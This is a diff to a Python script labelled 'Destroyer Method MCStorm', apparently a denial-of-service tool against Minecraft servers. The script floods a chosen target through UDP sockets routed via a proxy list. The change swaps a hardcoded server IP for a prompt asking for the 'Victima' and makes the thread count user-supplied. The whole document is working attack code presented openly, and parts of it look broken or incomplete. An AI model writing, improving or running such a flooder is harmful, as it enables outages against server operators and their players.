@@ -1,3 +1,7 @@
+#Destroyer Method MCStorm
+#Coded by GhostyCeh
+
+
 import socket
 import time
 import threading
@@ -10,7 +14,7 @@ from mcstatus import MinecraftServer
 import colorama
 from colorama import *
 
-os.system("cls || clear")
+os.system("clear")
 
 def main():
     global ip
@@ -22,7 +26,7 @@ def main():
     port = int(sys.argv[2])
     tiempo = int(sys.argv[3])
     lista = 'proxy.txt'
-    thr = 400
+    thr = input("[Destroyer] Threads: ")
     pprr = open(lista).readlines()
     atk()
 
@@ -33,13 +37,13 @@ def atk():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         pprr = open(lista).readlines()
-        server = MinecraftServer.lookup("144.217.10.200:25565")
+        server = MinecraftServer.lookup(input("[Destroyer] Victima?: "))
         status = server.status()
         if reloj()<duracion:
             proxy = random.choice(pprr).split(":")
             s.connect((str(proxy[0]), int(proxy[1])))
             print("{}".format(status.description))
-            print(Fore.CYAN + "Nueva conexion desde " + Fore.WHITE + str(proxy[0]) + ":" + str(proxy[1]))
+            print(Fore.CYAN + " " + Fore.WHITE + str(proxy[0]) + ":" + str(proxy[1]))
         else:
             exit()
 
